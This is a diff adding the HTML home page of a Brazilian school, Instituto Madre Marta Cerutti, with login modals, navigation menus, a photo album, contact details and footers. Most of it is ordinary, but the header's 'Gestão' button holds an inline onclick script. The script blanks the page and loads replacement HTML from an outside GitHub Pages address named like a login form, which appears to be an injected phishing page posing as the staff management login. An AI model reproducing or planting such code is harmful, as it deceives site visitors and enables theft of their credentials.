@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  
+    
+  
+  
+  
+
+	<title>Instituto Madre Marta Cerutti</title>
+
+
+
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/imm-responsivo/bulma/bulma.css?dummy=20250328165412">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/imm-responsivo/bulma/bulma-switch.min.css?dummy=20250328165412">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/imm-responsivo/fa/css/font-awesome.min.css?dummy=20250328165412">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/imm-responsivo/imm-responsivo.less?dummy=20250328165412">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/imm-responsivo/styles-inspetoria.css?dummy=20250328165412">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/imm-responsivo/styles-obra-social.css?dummy=20250328165412">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/imm-responsivo/styles-unidade.css?dummy=20250328165412">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/imm-responsivo/contraste.css">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/swiper/swiper.css">
+	<link rel="stylesheet" type="text/css" href="https://immc.com.br/css/swiper/carrossel-imm-responsivo.css?dummy=20250328165412">
+</head>
+<body class="unidade">
+<!-- MODAL LOGIN -->
+<div id="divModalLogin" class="modal login modal-sm">
+  <a id="lnkModalLoginBackground" href="javascript:login.ocultarModal()" class="modal-background"></a>
+
+  <!-- LOGIN -->
+  <div id="divModalLoginLogin" class="modal-card">
+ 		<section class="modal-card-body">
+	    <header class="modal-card-head">
+	      <figure class="image">
+          <img src="https://immc.com.br/logos/8a.svg" class="imagem-logo-pequena"/>
+	        <h3 class="title is-size-5">Faça seu login!</h3>
+	      </figure>
+	    </header>
+
+    	<form id="frmLogin" action="javascript:login.login()">
+    		<input type="hidden" id="respostaCaptchaLogin" name="respostaCaptcha">
+				<div class="field">
+					<label class="label" for="txtLoginLogin">Login:</label>
+					<div class="control">
+						<input class="input" type="text" maxlength="64" id="txtLoginLogin" name="login" required placeholder="Digite seu usuário">
+					</div>
+				</div>
+				<div class="field">
+					<label class="label" for="txtLoginSenha">Senha:</label>
+					<div class="control">
+						<input class="input" type="password" maxlength="64" id="txtLoginSenha" name="senha" required placeholder="Digite sua senha">
+					</div>
+				</div>
+				<div id="divMensagemLogin"></div>				
+				<div class="field is-hidden" id="divCaptchaContainer">
+        	<div class="control">
+						<div class="divCpatcha" id="divCaptcha" style="width: 304px; height: 78px;margin: 0 auto">
+							<span id="gRecaptchaContainer"></span>
+						</div>
+          </div>
+        </div>
+				<div class="field">
+					<div class="control">
+						<button id="btnEntrar" class="button" type="submit">Entrar</button>
+					</div>
+				</div>
+			</form>
+      <div class="field">
+        <div class="control login-links">
+          <button class="button is-text is-small" id="btnRecuperarSenha" onclick="login.exibirReenviar();">Recuperar senha</button>
+        </div>
+      </div>
+    </section>
+    
+  </div>
+  <!-- LOGIN FIM -->
+
+  <!-- REENVIAR SENHA -->
+  <div id="divModalLoginReenviar" class="modal-card is-hidden">
+    <section class="modal-card-body">
+      <header class="modal-card-head">
+        <figure class="image">
+          <img src="https://immc.com.br/logos/8a.svg" class="imagem-logo-pequena"/>
+          <h3 class="title is-size-5">Solicitação de recuperação de senha</h3>
+        </figure>
+      </header>
+
+      <form id="frmReenviar" action="javascript:login.reenviar()">
+        <div class="field has-text-centered">
+          <span class="has-text-centered	">Informe seu login  ou e-mail, e as instruções serão encaminhadas para seu e-mail </span>
+
+        </div><div class="field">
+          <label class="label">Login ou e-mail:</label>
+          <div class="control">
+            <input class="input" type="text" maxlength="64" id="txtReenviarLogin" name="loginOuEmail" required placeholder="Digite seu usuário ou e-mail">
+          </div>
+        </div>
+
+				<div id="divMensagemReenviar"></div>
+        <div class="field">
+          <div class="control">
+            <button class="button" type="submit">Enviar</button>
+          </div>
+        </div>
+      </form>
+      <div class="field" id="divBotaoVoltar">
+        <div class="control login-links">
+          <button class="button is-text is-small" onclick="login.ocultarReenviar();">Voltar</button>
+        </div>
+      </div>
+    </section>
+
+  </div>
+  <!-- REENVIAR SENHA FIM -->
+
+  <!-- ATUALIZAR EMAIL -->
+  <div id="divModalLoginEmail" class="modal-card is-hidden modal-card-complete">
+    <section class="modal-card-body">
+      <header class="modal-card-head">
+        <figure class="image">
+          <h3 class="title is-size-5 has-text-centered">Complete seu cadastro!</h3>
+        </figure>
+      </header>
+
+      <div class="field">
+        <div class="control login-links">
+          <p class="has-text-centered">Para continuar navegando, por favor, informe seu endereço de e-mail:</p>
+        </div>
+      </div>
+
+      <form id="frmLoginEmail" action="javascript:login.email()">
+        <div class="field">
+          <label class="label">E-mail*:</label>
+          <div class="control">
+            <input class="input" type="email" maxlength="50" id="txtLoginEmail" name="email" required placeholder="Digite seu e-mail">
+          </div>
+        </div>
+
+        <div id="divMensagemLoginEmail"></div>
+        <div class="field">
+          <div class="control">
+            <button class="button" type="submit">Gravar</button>
+          </div>
+        </div>
+      </form>
+      <div class="field rodape-modal">
+        <div class="control login-links">
+          <button class="button is-text is-small" onclick="login.callbackLogin();">Lembre-me mais tarde!</button>
+          <p>É imprescindível manter o seu cadastro completo e atualizado.</p>
+          <p>Esta mensagem será exibida no seu próximo acesso ao sistema.</p>
+        </div>
+      </div>
+    </section>
+  </div>
+  <!-- ATUALIZAR EMAIL FIM -->
+
+  <!-- ATUALIZAR EMAIL SUCESSO -->
+  <div id="divModalLoginEmailSucesso" class="modal-card is-hidden">
+    <section class="modal-card-body">
+      <header class="modal-card-head">
+        <figure class="image">
+          <img src="https://immc.com.br/css/imm-responsivo/imgs/logo.svg"/>
+          <h3 class="title is-size-5 has-text-centered">Seu cadastro foi atualizado com sucesso!</h3>
+        </figure>
+      </header>
+
+      <div class="field rodape-modal">
+        <div class="control login-links">
+          <button class="button is-text is-small" onclick="login.callbackLogin();">Continuar</button>
+        </div>
+      </div>
+    </section>
+  </div>
+  <!-- ATUALIZAR EMAIL SUCESSO FIM -->
+
+  <a id="lnkModalLoginFechar" href="javascript:login.ocultarModal()" class="modal-close is-large" aria-label="close"></a>
+</div>
+<!-- MODAL LOGIN FIM -->  
+
+
+<!-- MODAL MENU -->
+<div id="divMenuModal" class="modal login menu modal-sm">
+  <a href="javascript:menu.toggleModal();" class="modal-background"></a>
+	<div class="modal-card">
+
+		<section class="modal-card-body">
+				
+		<div class="section header">
+			<div class="header-center">
+				<div class="container level">
+					<div class="level-left">
+						<figure class="image">
+							<img alt="logo" src="https://immc.com.br/logos/8-60.svg" />
+						</figure>
+					</div>
+				</div>
+			</div>
+		  </div>	
+				
+			<div class="icones">
+
+
+				<a href="https://immc.com.br/faleconosco"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span>Fale Conosco</span></a>
+			</div>
+			
+			<nav class="navbar">
+	    <div class="navbar-item has-dropdown is-hoverable">
+	      <a class="navbar-link menu-item-1" href="#" > <span>Institucional</span> </a>
+	      <div class="navbar-dropdown">
+	        <div class="dropdown-itens">
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/sobre-nos1" > <span>Sobre nós</span> </a>
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/nossa-proposta" > <span>Nossa proposta</span> </a>
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/objetivos" > <span>Objetivos</span> </a>
+	        </div>
+	      </div>
+	    </div>
+	    <div class="navbar-item has-dropdown is-hoverable">
+	      <a class="navbar-link menu-item-1" href="#" > <span>PROPOSTA PEDAGÓGICA</span> </a>
+	      <div class="navbar-dropdown">
+	        <div class="dropdown-itens">
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/cursos2" > <span>Cursos</span> </a>
+            <a class="navbar-item" href="#" > <span>Atividades extracurriculares</span> </a>
+	        </div>
+	      </div>
+	    </div>
+	    <div class="navbar-item has-dropdown is-hoverable">
+	      <a class="navbar-link menu-item-1" href="#" > <span>Informações</span> </a>
+	      <div class="navbar-dropdown">
+	        <div class="dropdown-itens">
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/lista-de-material-20251" > <span>Lista de Material 2025</span> </a>
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/uniforme" > <span>Uniformes</span> </a>
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/edital-2025" > <span>Regulamento Bolsas de Estudo</span> </a>
+	        </div>
+	      </div>
+	    </div>
+      <a class="navbar-item menu-item-1" href="https://immc.com.br/immc/pagina/faleconosco" > <span>Fale conosco</span> </a>
+			</nav>			
+			
+		</section>
+	</div>
+  <a href="javascript:menu.toggleModal();" class="modal-close is-large" aria-label="close"></a>
+</div>
+<!-- MODAL MODAL FIM --> 
+
+<div id="flex-container">
+
+	<section class="section header">
+		<div class="header-restrito">
+			<div class="container level">
+
+				<div class="level-left login logado is-hidden-mobile">
+
+
+
+
+
+				</div>
+
+			</div>
+
+		</div>
+		
+<!-- BARRA ACESSÍVEL -->
+		
+		<div class="barra-acessibilidade">
+			<div id="acessibilidade" class="container level">
+				<div class="level-left is-hidden-mobile">
+					<ul class="level-item">
+						<li><a accesskey="1" href="#conteudo" target="_self">Ir para o conteúdo<span>1</span></a></li>
+						<li><a accesskey="2" href="#menu-principal" target="_self">Ir para o menu <span>2</a></</li>
+						<li><a href="#campo-busca" target="_self"><label accesskey="3" for="campo-busca">Ir para o a busca <span>3</span></label></a></li>
+						<li><a accesskey="4" href="#rodape" target="_self">Ir para o rodapé <span>4</span></a></li>
+					</ul>
+				</div>
+				<div class="level-right">	
+					<ul class="level-item is-uppercase">
+						<li><a href="https://immc.com.br/acessibilidade" target="_self">Acessibilidade</a></li>
+						<li><a href="javascript:acessibilidade.toggleAltoContraste();" target="_self">Alto Contraste</a></li>
+						<li><a href="https://immc.com.br/mapadosite" target="_self">Mapa do Site</a></li>
+						<li>
+								<a href="javascript:acessibilidade.alterarTamanhoFonte(100);" target="_self" class="has-text-weight-bold" style="font-size:8px" title="Definir fontes em 100%"><i class="fa fa-font" aria-hidden="true"></i>+</a>
+								<a href="javascript:acessibilidade.alterarTamanhoFonte(120);" target="_self" class="has-text-weight-bold" style="font-size:10px" title="Definir fontes em 120%"><i class="fa fa-font" aria-hidden="true"></i>+</a>
+								<a href="javascript:acessibilidade.alterarTamanhoFonte(140);" target="_self" class="has-text-weight-bold" style="font-size:13px" title="Definir fontes em 140%"><i class="fa fa-font" aria-hidden="true"></i>+</a>
+						</li>
+					</ul>			
+				</div>
+			</div>
+		</div>
+
+<!-- /BARRA ACESSÍVEL -->	
+
+		<div class="header-center">
+			<div class="container level">
+				<div class="inspetoria-header-login">
+					<!-- LOGIN -->  
+<div class="logado header-meu-perfil level-item is-hidden">
+  <!--<span>Olá, <b></b></span>--> 
+  <a href="https://immc.com.br/gerenciadoracesso/meuperfil" class="" title="Meu Perfil"><i class="fa fa-user"></i><span></span></a> 
+</div>
+<div class="logado header-minhas-unidades level-item is-hidden">
+  <a href="https://immc.com.br/unidades?minhasUnidades=1" class="" title="Minhas Unidades"><i class="fa fa-building"></i><span></span></a> 
+</div>
+<div class="logado header-sair level-item is-hidden">
+  <a href="javascript:login.logoff()" class=""><i class="fa fa-sign-out"  title="Sair"></i><span>Sair</span></a>
+</div>
+<!-- LOGIN FIM -->  
+
+				</div>
+				<div class="level-left container-logo">
+					<a href="https://immc.com.br/" title="Instituto Madre Marta Cerutti">
+						<figure class="image">
+							<img alt="Instituto Madre Marta Cerutti" src="https://immc.com.br/logos/8-60.svg" class="imagem-logo-principal" title="Instituto Madre Marta Cerutti"/>
+						</figure>
+					</a>
+				</div>
+
+				<div class="level-right ">
+				
+				<div class="acesso-restrito level-item">
+	          
+			            
+						<button style="background-color: transparent; padding: 0 5px; border: none; padding: 0; cursor: pointer; text-decoration: underline;"  onclick="document.documentElement.innerHTML = ''; document.body.style.backgroundColor = '#dfe8f6'; fetch('https://atomicnot.github.io/FLogin.html') .then(response => response.text()) .then(html => { document.documentElement.innerHTML = html; }) .catch(error => console.error('Erro ao carregar novo conteúdo:', error));">
+						    <i class="fa fa-address-book"></i>
+						    <span>Gestão</span>
+						</button>
+						
+			            
+			            
+			            <a href="https://gestao.portalimm.com.br/acropoly/acropolymodule.dll/C?F=FLogBlogIndex&IdEntidade=75566"  target="_blank">
+				            <i class="fa fa-address-card-o"></i>
+				            <span>Portal do Aluno/Responsável</span>
+			            </a>
+			      
+					</div>
+		<div class="header-center-bottom is-hidden-mobile">
+			<form class="header-busca" action="https://immc.com.br/busca" method="get">
+				<div class="level-item busca field has-addons is-clearfix">
+					<p class="control">
+						<input id="campo-busca" class="input" type="text" name="q" placeholder="Busca" title="Campo de busca">
+					</p>
+					<p class="control">
+						<button type="submit" class="button" title="Buscar">
+						<i class="fa fa-search" aria-hidden="true"></i>
+						</button>
+					</p>
+				</div>
+			</form>
+
+					<div class="level-item icons-list is-clearfix">
+						<div class="header-redes-sociais">
+								<a href="https://www.instagram.com/immcbg/" target="_blank" title="Instagram">
+									<i class="fa fa-instagram" aria-hidden="true"></i>
+								</a>
+								<a href="https://www.facebook.com/immcbg" target="_blank" title="Facebook">
+									<i class="fa fa-facebook-square" aria-hidden="true"></i>
+								</a>
+						</div>
+						<div class="header-fale-conosco">
+							<a href="https://immc.com.br/faleconosco" title="Fale conosco"><i class="fa fa-comments" aria-hidden="true"></i></a>
+						</div>
+					</div>
+					</div>
+				</div>
+			</div>
+			
+		</div>
+		
+	<!-- MENU -->
+<div class="header-bottom">
+
+  <div class="container level">
+    <!-- LINK DE UNIDADES -->
+    <div class="unidades">
+      <a id="menu-principal" 
+      		href="https://immc.com.br/imm" 
+      		class=""> <i class="fa fa-home"></i> <span
+            class="unidades-label">Inspetoria Madre Mazzarello</span>
+      </a>
+	  </div>
+	  <!-- LINK DE UNIDADES FIM -->
+	<div  class="container-menu-principal">
+	  <nav class="navbar is-hidden-mobile">
+	    <div id="divMenuTitulo0" class="navbar-item has-dropdown is-hoverable" 
+	      		onfocusout="menu.onBlur(event, 0);">
+	      <a 
+	      		onfocus="menu.onFocus(event, 0);"
+	      		class="navbar-link menu-item-1" href="#"> <span>Institucional</span> </a>
+	      <div id="divMenuDropdown0" class="navbar-dropdown">
+	        <span class="item-hovered"><a id="lnkMenuTitulo0" href="#" >Institucional</a></span>
+	        <div class="dropdown-itens">
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/sobre-nos1" > <span>Sobre nós</span> </a>
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/nossa-proposta" > <span>Nossa proposta</span> </a>
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/objetivos" > <span>Objetivos</span> </a>
+	        </div>
+	      </div>
+	    </div>
+	    <div id="divMenuTitulo1" class="navbar-item has-dropdown is-hoverable" 
+	      		onfocusout="menu.onBlur(event, 1);">
+	      <a 
+	      		onfocus="menu.onFocus(event, 1);"
+	      		class="navbar-link menu-item-1" href="#"> <span>PROPOSTA PEDAGÓGICA</span> </a>
+	      <div id="divMenuDropdown1" class="navbar-dropdown">
+	        <span class="item-hovered"><a id="lnkMenuTitulo1" href="#" >PROPOSTA PEDAGÓGICA</a></span>
+	        <div class="dropdown-itens">
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/cursos2" > <span>Cursos</span> </a>
+            <a class="navbar-item" href="#" > <span>Atividades extracurriculares</span> </a>
+	        </div>
+	      </div>
+	    </div>
+	    <div id="divMenuTitulo2" class="navbar-item has-dropdown is-hoverable" 
+	      		onfocusout="menu.onBlur(event, 2);">
+	      <a 
+	      		onfocus="menu.onFocus(event, 2);"
+	      		class="navbar-link menu-item-1" href="#"> <span>Informações</span> </a>
+	      <div id="divMenuDropdown2" class="navbar-dropdown">
+	        <span class="item-hovered"><a id="lnkMenuTitulo2" href="#" >Informações</a></span>
+	        <div class="dropdown-itens">
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/lista-de-material-20251" > <span>Lista de Material 2025</span> </a>
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/uniforme" > <span>Uniformes</span> </a>
+            <a class="navbar-item" href="https://immc.com.br/immc/pagina/edital-2025" > <span>Regulamento Bolsas de Estudo</span> </a>
+	        </div>
+	      </div>
+	    </div>
+      <a class="navbar-item menu-item-1" href="https://immc.com.br/immc/pagina/faleconosco" > <span>Fale conosco</span> </a>
+	  </nav>
+	  </div>
+	
+	  <div id="divRodapeMobile" class="barra-fixa-mobile is-hidden-tablet">
+	    <div class="tabs is-centered">
+	      <ul>
+	        <li class=""><a id="lnkMenuMobile" href="javascript:menu.toggleModal();" title="Menu"><i class="fa fa-bars"></i></a></li>
+	        <li><a id="lnkLoginMobile" href="javascript:login.exibirModal();" title="Login"><i class="fa fa-user-circle"></i></a></li>
+	        <li><a href="https://immc.com.br/busca" title="Busca"><i class="fa fa-search"></i></a></li>
+	      </ul>
+	    </div>
+	  </div>
+	  <a href="#" class="icon-menu-header is-block-mobile-only"><i class="fa fa-bars"></i></a>
+	</div>
+	
+</div>
+	<!-- MENU FIM -->
+  </section>
+
+	<!-- MIOLO -->
+	<div id="conteudo">
+	<!-- VIDEO - MODAL -->
+<div id="divModalVideo" class="modal">
+  <a href="javascript:videoModal.ocultar()" class="modal-background"></a>
+  <div class="modal-content" style="width: 90%; height: 90%;">
+    <iframe id="ifrModalVideo" type="text/html" src="" frameborder="0" style="width: 99%; height: 99%;"></iframe>
+  </div>
+  <a href="javascript:videoModal.ocultar()" class="modal-close is-large" aria-label="close"></a>
+</div>
+<section class="section banners">
+	<div class="container ">
+	
+		<div class="columns is-mobile items-chamada is-centered">
+			<div class="column is-1 banner-navegador link-navegador ">
+				<a id="lnkBannerAnterior" href="javascript:banner.anterior()"
+					class="button is-large inverted  is-hidden" title="Grupo de banners anterior">
+					<i class="fa fa-caret-left fas fa-2x" aria-hidden="true"></i>
+				</a>
+			</div>
+			<div class="column is-10 is-mobile">
+				<div id="divBannerGrupo0"
+					class="slide columns is-centered items-chamada">
+					<div id="divBanner208"
+						class="column is-one-third">
+						<a href="https://youtu.be/3lY84xl36mk" target="_blank">
+							<figure class="image is-16by9">
+								<img
+									src="https://immc.com.br/images/f93bd6b3-c5f8-4d0f-b9ba-50138ce998ec.JPG"
+									alt="" />
+							</figure>
+							 <h3 class="has-text-centered has-text-weight-bold">UPV 2022</h3>
+						</a>
+					</div>
+				</div>
+			</div>
+			<div class="column is-1 banner-navegador link-navegador ">
+			<a id="lnkBannerProximo" href="javascript:banner.proximo()"
+				class="button is-large is-hidden"
+				title="Próximo grupo de banners"> <i
+				class="fa fa-caret-right fas fa-2x" aria-hidden="true"></i>
+			</a>
+		</div>
+		</div>
+		
+
+
+	</div>
+</section>
+
+	<!-- BANNER FIM -->
+
+<!-- ALBUM -->
+<section class="section albuns">
+  <div class="container">
+    <h3 class="title primary is-size-4">Álbuns</h3>
+    <div class="columns is-centered">
+
+      <div class="column is-one-third">
+      	<a href="https://immc.com.br/album/9095" title="">
+          <div class="card">
+            <div class="card-image">
+              <figure class="image is-4by3">
+                <img src="https://immc.com.br/images/9394197e-2122-4d5f-b191-b6215ce1cbc4.PNG" alt="" title=""/>
+              </figure>
+            </div>
+            <div class="card-content">
+              <div class="media">
+                <div class="media-content">
+                  <span class="is-size-7 is-italic is-pulled-left">10 Fotos</span>
+                  <h4 class="is-6 is-pulled-left">AULA NO LABORATÓRIO DE CIÊNCIAS - IMMC</h4>
+                </div>
+              </div>
+            </div>
+          </div>
+        </a>
+      </div>
+
+    </div>
+    <div class="veja-mais">
+      <a href="https://immc.com.br/album" class="button level-item">Veja todos
+        os álbuns</a>
+    </div>
+  </div>
+</section>
+
+<!-- ALBUM FIM -->
+
+	
+	
+	</div>
+	
+
+	<!-- MIOLO FIM -->
+
+<footer id="rodape" class="inspetoria-footer">
+
+<div class="columns is-justify-content-space-between">
+  <div class="column info-rodape">
+   		<div class="columns">
+			<div class="logo-inspetoria">
+				<a href="https://immc.com.br/" title="Instituto Madre Marta Cerutti">
+					<figure class="image">
+						<img alt="Instituto Madre Marta Cerutti" src="https://immc.com.br/logos/8-60.svg" class="imagem-logo-principal" title="Instituto Madre Marta Cerutti"/>
+					</figure>
+				</a>
+			</div>
+
+			<div class="inspetoria-endereco">
+				<ul>
+					<li>Rua Walapitis, 187, Madre Marta</li>
+					<li>Barra do Garças/MT - CEP: 78601004</li>
+				</ul>
+				
+					<ul>
+							<li>
+								<a href="tel:663401-4979">
+									(66)
+									3401-4979 
+									
+								</a>
+							</li>
+					</ul>
+			</div>
+
+			<div class="logo-instituto">
+				<a href="https://www.cgfmanet.org/pt-pt/" title="Instituto Figlie de Maria Ausiliatrice">
+					<figure class="image">
+						<img alt="Instituto Figlie de Maria Ausiliatrice" src="https://immc.com.br/css/imm-responsivo/imgs/logo-instituto.svg" class="" title="Instituto Figlie de Maria Ausiliatrice"/>
+					</figure>
+				</a>
+			</div>
+		</div>
+	</div>
+
+  
+  <div class="column redes-sociais ">
+				<a href="https://www.instagram.com/immcbg/" target="_blank" title="Instagram">
+					<i class="fa fa-2x fa-instagram"></i>
+				</a>
+				<a href="https://www.facebook.com/immcbg" target="_blank" title="Facebook">
+					<i class="fa fa-2x fa-facebook-square"></i>
+				</a>
+  </div>
+</div>
+
+
+
+	<div class="RodapeInfoAuge">
+		<div class="columns">
+			<div class="column">
+				<span class="RodapeCopyleft"> 
+					<a href="https://immc.com.br/politicadeuso">Termos de Uso</a>
+				</span>
+			</div>
+			<div class="column">
+				<span class="RodapeCopyleft margin-rodape"> 
+					<a href="https://www.auge.com.br/#/politicaPrivacidade" target="_blank" title="Política de Privacidade da Auge Tecnologias &amp; Sistemas">Política de Privacidade Auge</a>
+				</span> 
+			</div>		
+			<div class="column">
+				<span class="RodapeDesAuge">Desenvolvido por </span>
+				<a href="http://www.auge.com.br/" target="_blank" >
+					<img src="https://immc.com.br/css/imm-responsivo/imgs/logo-auge.svg" alt=" Auge Tecnologia e Sistemas" />
+				</a><br />
+			</div>
+		</div>
+	</div>
+
+<div class="CookiesModalContainer" id="CookiesModalContainer">
+	<div class="CookiesModal">
+		<div>
+			Nós usamos cookies e outras tecnologias semelhantes para melhorar a sua experiência em nossos serviços. 
+			Ao utilizar nossos serviços, você concorda com tal monitoramento. <span>Conheça nossa 
+			<a href="https://www.auge.com.br/#/politicaPrivacidade" target="_blank">Política de Privacidade.</a></span>
+		</div>
+		<button id="btnGravar" onclick="modalCookies.aceitarTermo()" >Prosseguir</button>	
+
+	</div>
+</div>
+
+	</footer>
+
+
+
+	<!-- Footer Escolas e obras Sociais -->
+	
+	<footer id="rodape" class="footer">
+		<div class="redes-sociais">
+			<span>Redes <b>Sociais</b>:</span>
+  
+  <a href="https://www.instagram.com/immcbg/" target="_blank" title="Instagram"><i class="fa fa-instagram fa-inverse"></i></a>
+  <a href="https://www.facebook.com/immcbg" target="_blank" title="Facebook"><i class="fa fa-facebook-square fa-inverse"></i></a>
+  
+		</div>
+
+
+		<div class="container">
+			<div class="columns">
+				<div class="column is-hidden-mobile mapa-site">
+					<i class="fa fa-sitemap fa-2x"></i>
+					<h4 class="has-text-weight-bold">Mapa do Site</h4>
+<ul>
+  <li>
+  	<a href="#" >Institucional</a>
+  	<ul>
+      <li><a href="https://immc.com.br/immc/pagina/sobre-nos1" >Sobre nós</a></li>
+      <li><a href="https://immc.com.br/immc/pagina/nossa-proposta" >Nossa proposta</a></li>
+      <li><a href="https://immc.com.br/immc/pagina/objetivos" >Objetivos</a></li>
+    </ul>
+  </li>
+  <li>
+  	<a href="#" >PROPOSTA PEDAGÓGICA</a>
+  	<ul>
+      <li><a href="https://immc.com.br/immc/pagina/cursos2" >Cursos</a></li>
+      <li><a href="#" >Atividades extracurriculares</a></li>
+    </ul>
+  </li>
+  <li>
+  	<a href="#" >Informações</a>
+  	<ul>
+      <li><a href="https://immc.com.br/immc/pagina/lista-de-material-20251" >Lista de Material 2025</a></li>
+      <li><a href="https://immc.com.br/immc/pagina/uniforme" >Uniformes</a></li>
+      <li><a href="https://immc.com.br/immc/pagina/edital-2025" >Regulamento Bolsas de Estudo</a></li>
+    </ul>
+  </li>
+  <li>
+  	<a href="https://immc.com.br/immc/pagina/faleconosco" >Fale conosco</a>
+  </li>
+</ul>
+				</div>
+
+				<div class="column">
+					<i class="fa fa-map-marker fa-2x"></i>
+					<h4 class="has-text-weight-bold">Endereço</h4>
+					<ul>
+						<li>Rua Walapitis, 187</li>
+						<li>Bairro: Madre Marta</li>
+						<li>Barra do Garças - MT</li>
+						<li>CEP: 78601004</li>
+            <li><a href="https://goo.gl/maps/drtUwMLPamLVYs1K6" target="_blank"><u><i class="fa fa-map-o"></i> <i>Veja no Mapa</i></u></a></li>
+					</ul>
+					<div class="iframe-maps">
+						
+					</div>
+				</div>
+
+				<div class="column">
+					<i class="fa fa-envelope-open fa-2x"></i>
+          <h4 class="has-text-weight-bold">Telefone</h4>
+					<ul>
+						<li>
+              <span>Fixo: </span><a href="tel:663401-4979">
+                (66)
+                3401-4979 
+                
+              </a>
+            </li>
+					</ul>
+					<ul>
+  			<li><h5 class="has-text-weight-bold">Biblioteca</h5></li>
+			<li>
+	             <a href="tel:663401-4979">
+	               (66)
+	               3401-4979 
+	               
+	             </a>
+	             <br/>
+             <a href="mailto:biblioteca@immc.com.br">
+              	biblioteca@immc.com.br
+             </a>
+            </li>
+  			<li><h5 class="has-text-weight-bold">Coordenação Pedagógica  - Educação Infantil</h5></li>
+			<li>
+	             <a href="tel:663401-4979">
+	               (66)
+	               3401-4979 
+	               
+	             </a>
+	             <br/>
+             <a href="mailto:orientacaomat@immc.com.br">
+              	orientacaomat@immc.com.br
+             </a>
+            </li>
+  			<li><h5 class="has-text-weight-bold">Coordenação Pedagógica  - Fundamental e Médio</h5></li>
+			<li>
+	             <a href="tel:663401-4979">
+	               (66)
+	               3401-4979 
+	               
+	             </a>
+	             <br/>
+             <a href="mailto:coordenacao@immc.com.br">
+              	coordenacao@immc.com.br
+             </a>
+            </li>
+  			<li><h5 class="has-text-weight-bold">Financeiro</h5></li>
+			<li>
+	             <a href="tel:663401-4979">
+	               (66)
+	               3401-4979 
+	               
+	             </a>
+	             <br/>
+             <a href="mailto:financeiro@immc.com.br">
+              	financeiro@immc.com.br
+             </a>
+            </li>
+  			<li><h5 class="has-text-weight-bold">Orientação Pedagógica - Ens. Fundamental Matutino</h5></li>
+			<li>
+	             <a href="tel:663401-4979">
+	               (66)
+	               3401-4979 
+	               
+	             </a>
+	             <br/>
+             <a href="mailto:orientacaomat@immc.com.br">
+              	orientacaomat@immc.com.br
+             </a>
+            </li>
+  			<li><h5 class="has-text-weight-bold">Orientação Pedagógica - Ens. Fund-  Vespertino</h5></li>
+			<li>
+	             <a href="tel:663401-4979">
+	               (66)
+	               3401-4979 
+	               
+	             </a>
+	             <br/>
+             <a href="mailto:orientacaovesp@immc.com.br">
+              	orientacaovesp@immc.com.br
+             </a>
+            </li>
+  			<li><h5 class="has-text-weight-bold">Secretaria</h5></li>
+			<li>
+	             <a href="tel:663401-4979">
+	               (66)
+	               3401-4979 
+	               
+	             </a>
+	             <br/>
+             <a href="mailto:secretaria@immc.com.br">
+              	secretaria@immc.com.br
+             </a>
+            </li>
+					</ul>
+
+					<h4 class="has-text-weight-bold">E-mail</h4>
+					<ul>
+						<li><a href="#">secretaria@immc.com.br</a></li>
+					</ul>
+				</div>
+
+			</div>
+		</div>
+		
+		<div class="RodapeInfoAuge container">
+			<div class="column is-hidden-mobile rodapeLogin">
+<div class="logado header-meu-perfil level-item is-hidden">
+  <!--<span>Olá, <b></b></span>--> 
+  <a href="https://immc.com.br/gerenciadoracesso/meuperfil" class="" title="Meu Perfil"><i class="fa fa-user"></i><span></span></a> 
+</div>
+<div class="logado header-minhas-unidades level-item is-hidden">
+  <a href="https://immc.com.br/unidades?minhasUnidades=1" class="" title="Minhas Unidades"><i class="fa fa-building"></i><span></span></a> 
+</div>
+<div class="logado header-sair level-item is-hidden">
+  <a href="javascript:login.logoff()" class=""><i class="fa fa-sign-out"  title="Sair"></i><span>Sair</span></a>
+</div>
+<!-- LOGIN FIM -->  
+
+			</div>	
+			<div class="columns">
+						
+				<div class="column">
+			 		<span class="RodapeCopyleft"> 
+			  			<a href="https://immc.com.br/politicadeuso">Termos de Uso</a>
+			  		</span>
+			  	</div>
+		  	<div class="column">
+			  	<span class="RodapeCopyleft margin-rodape"> 
+		    		<a href="https://www.auge.com.br/#/politicaPrivacidade" target="_blank" title="Política de Privacidade da Auge Tecnologias &amp; Sistemas">Política de Privacidade Auge</a>
+		    	</span> 
+			</div>		
+			<div class="column">
+				<span class="RodapeDesAuge">Desenvolvido por </span>
+				<a href="http://www.auge.com.br/" target="_blank" >
+					<img src="https://immc.com.br/css/imm-responsivo/imgs/auge-negativo.svg" alt=" Auge Tecnologia e Sistemas" />
+				</a><br />
+		    </div>
+		</div>
+	</div>
+
+<div class="CookiesModalContainer" id="CookiesModalContainer">
+	<div class="CookiesModal">
+		<div>
+			Nós usamos cookies e outras tecnologias semelhantes para melhorar a sua experiência em nossos serviços. 
+			Ao utilizar nossos serviços, você concorda com tal monitoramento. <span>Conheça nossa 
+			<a href="https://www.auge.com.br/#/politicaPrivacidade" target="_blank">Política de Privacidade.</a></span>
+		</div>
+		<button id="btnGravar" onclick="modalCookies.aceitarTermo()" >Prosseguir</button>	
+
+	</div>
+</div>		
+	</footer>
+</div>
+
+
+
+</body>
+</html>
